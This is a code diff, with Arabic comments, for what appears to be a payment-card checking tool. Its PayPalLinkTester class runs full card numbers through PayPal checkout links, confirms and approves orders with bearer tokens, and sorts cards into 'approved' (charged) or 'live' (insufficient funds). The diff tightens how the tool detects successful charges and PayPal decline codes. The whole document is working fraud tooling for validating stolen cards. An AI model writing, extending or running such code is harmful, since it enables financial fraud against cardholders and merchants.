@@ -106,7 +106,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== NEW PAYPAL CLASS =====================
+# ===================== PAYPAL CLASS =====================
 
 class PayPalLinkTester:
     def __init__(self, target_url):
@@ -347,16 +347,24 @@ class PayPalLinkTester:
         if '<!DOCTYPE' in text_upper or '<html' in text_upper:
             return "HTML Response"
         
-        if 'true' in text_lower or 'charge 1' in text_lower or 'charge $' in text_lower or 'charged' in text_lower or 'completed' in text_lower or 'approved' in text_lower or 'success' in text_lower:
-            if 'error' not in text_lower and 'expecting' not in text_lower and 'invalid' not in text_lower:
-                return "CHARGE 1.0"
-        
+        # محاولة استخراج JSON الأول
         try:
             json_data = json.loads(text)
             if isinstance(json_data, dict):
+                # check data.error
                 if 'data' in json_data and isinstance(json_data['data'], dict):
                     if 'error' in json_data['data']:
                         return str(json_data['data']['error'])
+                    # الشحن الناجح من الموقع
+                    if 'status' in json_data['data']:
+                        status_val = str(json_data['data']['status']).upper()
+                        if status_val == 'COMPLETED' or status_val == 'APPROVED':
+                            return "CHARGE 1.0"
+                    if 'success' in json_data['data']:
+                        if json_data['data']['success'] == True or str(json_data['data']['success']).lower() == 'true':
+                            return "CHARGE 1.0"
+                
+                # check error
                 if 'error' in json_data:
                     if isinstance(json_data['error'], str):
                         return json_data['error']
@@ -365,10 +373,29 @@ class PayPalLinkTester:
                             return json_data['error']['message']
                         if 'name' in json_data['error']:
                             return json_data['error']['name']
+                
+                # الشحن الناجح
+                if 'status' in json_data:
+                    status_val = str(json_data['status']).upper()
+                    if status_val == 'COMPLETED' or status_val == 'APPROVED':
+                        return "CHARGE 1.0"
+                
+                if 'success' in json_data:
+                    if json_data['success'] == True or str(json_data['success']).lower() == 'true':
+                        return "CHARGE 1.0"
+                
+                # check name (PayPal error codes)
                 if 'name' in json_data:
-                    return json_data['name']
+                    name_val = str(json_data['name']).upper()
+                    if name_val in ['INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'RESTRICTED_OR_INACTIVE_ACCOUNT', 'EXPIRED_CARD', 'DECLINED_PLEASE_RETRY']:
+                        return name_val
+                    return str(json_data['name'])
+                
+                # check message
                 if 'message' in json_data:
                     return str(json_data['message'])
+                
+                # check details array
                 if 'details' in json_data and isinstance(json_data['details'], list) and len(json_data['details']) > 0:
                     detail = json_data['details'][0]
                     if isinstance(detail, dict):
@@ -379,6 +406,7 @@ class PayPalLinkTester:
         except:
             pass
         
+        # رسائل محددة
         if 'insufficient' in text_lower:
             return "INSUFFICIENT_FUNDS"
         if 'order_not_approved' in text_lower:
@@ -396,6 +424,7 @@ class PayPalLinkTester:
         if 'payer_cannot_pay' in text_lower:
             return "Payer cannot pay for this transaction."
         
+        # استخراج issue من النص
         error_match = re.search(r'"issue"\s*:\s*"([^"]+)"', text)
         if error_match:
             return error_match.group(1)
@@ -416,6 +445,7 @@ class PayPalLinkTester:
         if data_error:
             return data_error.group(1)
         
+        # لو النص قصير نرجعه زي ما هو
         if len(text) < 200:
             return text.strip()
         
@@ -631,6 +661,8 @@ class PayPalLinkTester:
             
             confirm_json = {}
             confirm_text = ""
+            confirm_status_code = 0
+            
             for auth_token in auth_tokens:
                 he4 = {
                     'authorization': f'Bearer {auth_token}',
@@ -657,40 +689,86 @@ class PayPalLinkTester:
                         timeout=15
                     )
                     confirm_text = confirm_res.text
-                    if confirm_res.status_code == 200:
-                        try:
-                            confirm_json = confirm_res.json()
-                        except:
-                            confirm_json = {}
-                        break
-                    else:
+                    confirm_status_code = confirm_res.status_code
+                    
+                    if confirm_res.status_code != 200:
                         clean = self._clean_response(confirm_res.text)
-                        if clean and clean != "DECLINED" and clean != "No Response":
+                        if clean and clean != "No Response" and clean != "HTML Response":
                             return clean
+                        continue
+                    
+                    try:
+                        confirm_json = confirm_res.json()
+                    except:
+                        confirm_json = {}
+                    
+                    if isinstance(confirm_json, dict):
+                        # check data.error
+                        if 'data' in confirm_json and isinstance(confirm_json['data'], dict):
+                            if 'error' in confirm_json['data']:
+                                return str(confirm_json['data']['error'])
+                            if 'status' in confirm_json['data']:
+                                status_val = str(confirm_json['data']['status']).upper()
+                                if status_val == 'COMPLETED' or status_val == 'APPROVED':
+                                    return "CHARGE 1.0"
+                            if 'success' in confirm_json['data']:
+                                if confirm_json['data']['success'] == True or str(confirm_json['data']['success']).lower() == 'true':
+                                    return "CHARGE 1.0"
+                        
+                        # check error
+                        if 'error' in confirm_json:
+                            if isinstance(confirm_json['error'], str):
+                                return confirm_json['error']
+                            elif isinstance(confirm_json['error'], dict):
+                                if 'message' in confirm_json['error']:
+                                    return confirm_json['error']['message']
+                                if 'name' in confirm_json['error']:
+                                    return confirm_json['error']['name']
+                        
+                        # الشحن الناجح
+                        if 'status' in confirm_json:
+                            status_val = str(confirm_json['status']).upper()
+                            if status_val == 'COMPLETED' or status_val == 'APPROVED':
+                                return "CHARGE 1.0"
+                        
+                        if 'success' in confirm_json:
+                            if confirm_json['success'] == True or str(confirm_json['success']).lower() == 'true':
+                                return "CHARGE 1.0"
+                        
+                        # check name (PayPal error codes)
+                        if 'name' in confirm_json:
+                            name_val = str(confirm_json['name']).upper()
+                            if name_val in ['INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'RESTRICTED_OR_INACTIVE_ACCOUNT', 'EXPIRED_CARD', 'DECLINED_PLEASE_RETRY']:
+                                return name_val
+                            return str(confirm_json['name'])
+                        
+                        # check details array
+                        if 'details' in confirm_json and isinstance(confirm_json['details'], list) and len(confirm_json['details']) > 0:
+                            detail = confirm_json['details'][0]
+                            if isinstance(detail, dict):
+                                issue = detail.get('issue', '')
+                                description = detail.get('description', '')
+                                if issue:
+                                    return f"{issue}: {description}" if description else issue
+                    
+                    if confirm_json and len(confirm_json) > 0:
+                        break
+                    
                 except:
                     continue
             
-            if isinstance(confirm_json, dict) and len(confirm_json) > 0:
-                confirm_str = str(confirm_json).upper()
-                if 'INSUFFICIENT_FUNDS' in confirm_str:
-                    return "INSUFFICIENT_FUNDS"
-                if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in confirm_str:
-                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-                if 'PAYEE_BLOCKED_TRANSACTION' in confirm_str:
-                    return "PAYEE_BLOCKED_TRANSACTION"
-                if 'SUSPECTED_FRAUD' in confirm_str:
-                    return "SUSPECTED_FRAUD"
-                if 'EXPIRED_CARD' in confirm_str:
-                    return "EXPIRED_CARD"
-                clean = self._clean_response(str(confirm_json))
-                if clean and clean != "DECLINED":
-                    return clean
-            
-            if confirm_text:
+            # لو confirm رجع حاجة نرجعها
+            if confirm_text and confirm_status_code != 200:
                 clean = self._clean_response(confirm_text)
-                if clean and clean != "DECLINED" and clean != "No Response":
+                if clean and clean != "No Response":
                     return clean
             
+            if confirm_json and len(confirm_json) > 0:
+                clean = self._clean_response(json.dumps(confirm_json))
+                if clean and clean != "No Response":
+                    return clean
+            
+            # approve - هنا بيتم الدفع الفعلي
             approve_res = self._approve_order(order_id)
             text = approve_res.text if approve_res else ''
             
@@ -703,7 +781,7 @@ class PayPalLinkTester:
         except Exception as e:
             return f"Error: {e}"
 
-# ===================== END NEW PAYPAL CLASS =====================
+# ===================== END PAYPAL CLASS =====================
 
 async def check_card_api(card_full, gateway_url):
     async with api_semaphore:
@@ -715,7 +793,7 @@ async def check_card_api(card_full, gateway_url):
             result_raw = await loop.run_in_executor(None, run_check)
             result = str(result_raw).lower()
             
-            if "true" in result or "charge 1" in result or "charge $" in result or "charged" in result:
+            if "charge 1" in result or "charge $" in result:
                 return "approved", result_raw
             elif "insufficient" in result:
                 return "live", result_raw
